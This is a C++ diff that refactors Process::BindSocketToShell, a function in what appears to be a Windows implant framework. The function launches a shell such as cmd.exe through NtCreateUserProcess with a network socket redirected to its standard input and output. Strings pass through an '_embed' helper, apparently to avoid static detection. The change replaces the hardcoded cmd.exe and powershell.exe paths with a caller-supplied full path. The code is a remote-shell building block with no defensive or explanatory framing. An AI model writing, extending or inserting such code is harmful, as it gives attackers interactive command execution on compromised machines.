@@ -149,7 +149,9 @@ static void InitUnicodeString(UNICODE_STRING* dest, const WCHAR* src, USIZE len)
     dest->MaximumLength = (UINT16)((len + 1) * sizeof(WCHAR));
 }
 
-// BindSocketToShell - Create a process with socket as stdin/stdout/stderr
+// BindSocketToShell - Create a process with socket redirected to stdin/stdout/stderr
+// The cmd parameter must be a full path to the executable (e.g., "C:\Windows\System32\cmd.exe")
+// Caller is responsible for providing the correct path (e.g., via environment variable COMSPEC)
 SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
 {
     if (socketFd < 0 || cmd == nullptr)
@@ -160,49 +162,24 @@ SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
     // Socket handle for redirection
     PVOID socketHandle = (PVOID)socketFd;
 
-    // Build NT path for common shells
+    // Build NT path from provided process path
     // NtCreateUserProcess requires full NT paths like \??\C:\Windows\System32\cmd.exe
+    // Caller must provide full path (e.g., from env("COMSPEC"))
     WCHAR imagePathBuf[512];
     USIZE imagePathLen = 0;
 
-    // Check for common shell names and build NT paths
-    // cmd.exe -> \??\C:\Windows\System32\cmd.exe
-    // powershell.exe -> \??\C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-    BOOL isCmd = String::Equals(cmd, (PCCHAR)"cmd.exe"_embed);
-    BOOL isPowerShell = String::Equals(cmd, (PCCHAR)"powershell.exe"_embed);
-    if (isCmd)
+    // Prepend \??\ NT prefix to the provided path
+    imagePathBuf[0] = L'\\';
+    imagePathBuf[1] = L'?';
+    imagePathBuf[2] = L'?';
+    imagePathBuf[3] = L'\\';
+    imagePathLen = 4;
+
+    // Copy the provided path (must be full path like C:\Windows\System32\cmd.exe)
+    USIZE i = 0;
+    while (cmd[i] != '\0' && imagePathLen < 511)
     {
-        // \??\C:\Windows\System32\cmd.exe
-        const WCHAR* ntPath = L"\\??\\C:\\Windows\\System32\\cmd.exe"_embed;
-        while (ntPath[imagePathLen] != L'\0' && imagePathLen < 511)
-        {
-            imagePathBuf[imagePathLen] = ntPath[imagePathLen];
-            imagePathLen++;
-        }
-    }
-    else if (isPowerShell)
-    {
-        // \??\C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-        const WCHAR* ntPath = L"\\??\\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"_embed;
-        while (ntPath[imagePathLen] != L'\0' && imagePathLen < 511)
-        {
-            imagePathBuf[imagePathLen] = ntPath[imagePathLen];
-            imagePathLen++;
-        }
-    }
-    else
-    {
-        // For other paths, assume it's already a valid path and prepend \\??
-        imagePathBuf[0] = L'\\';
-        imagePathBuf[1] = L'?';
-        imagePathBuf[2] = L'?';
-        imagePathBuf[3] = L'\\';
-        imagePathLen = 4;
-        USIZE i = 0;
-        while (cmd[i] != '\0' && imagePathLen < 511)
-        {
-            imagePathBuf[imagePathLen++] = (WCHAR)cmd[i++];
-        }
+        imagePathBuf[imagePathLen++] = (WCHAR)cmd[i++];
     }
     imagePathBuf[imagePathLen] = L'\0';
 
